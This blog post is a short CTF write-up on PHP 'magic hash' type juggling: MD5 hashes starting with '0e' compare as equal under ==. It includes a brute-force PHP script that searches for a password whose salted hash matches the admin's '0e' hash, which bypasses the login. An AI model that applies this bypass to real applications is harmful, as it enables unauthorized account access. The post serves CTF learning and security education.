---
layout:     post
title:      "PHP md5 function vulnerability"
subtitle:   "CTF writeup, Internetwache CTF"
date:       2016-02-25 10:00:00
author:     "Heeraj"
header-img: "img/post-bg-02.png"
---
<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>

<p>Well I thought to discuss an 50 problem web challenge, interesting. There is no admin.php on the server, but there is flag.php on
the server. We have a login option in which the username is given, and password hash is given , but there is salt involved.</p>

<p>Ya correct whats so interesting, its intresting because here <a href="https://news.ycombinator.com/item?id=9484757"
see this article</a>.All those md5 value which start with 0e, are chossen as equal in php,because they're being parsed as floats and getting converted to 0.0. So we can say md5('240610708') == md5('QNKCDZO').</p>

<blockquote>
<?php<br>  
$admin_user = "pr0_adm1n";<br>
$admin_pw = clean_hash("0e408306536730731920197920342119");<br>
<br>
function clean_hash($hash) {<br>  
    return preg_replace("/[^0-9a-f]/","",$hash);<br>
}<br>
<br>
function myhash($str) {<br>  
    return clean_hash(md5(md5($str) . "SALT"));<br>
}<br>
<br>
function generateRandomString($length = 10) { <br> 
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';<br>
    $charactersLength = strlen($characters);<br>
    $randomString = '';<br>
    for ($i = 0; $i < $length; $i++) {<br>
        $randomString .= $characters[rand(0, $charactersLength - 1)];<br>
    }<br>
    return $randomString;<br>
}<br>
<br>
for ($i = 0; $i < 100000000; $i++) {<br>  
    $result = generateRandomString(8);<br>
    if (myhash($result) == $admin_pw) {<br>
        print("woo!");<br>
        print($result . "  " . myhash($result) . "\n");<br>
    }<br>
}<br>
?><br>
</blockquote>

<p>Reffered from https://eugenekolo.com</p>

<p>This was one of the problems in web in Internetwache CTF.</p>

<p>Thank you for reading the blog! </p>
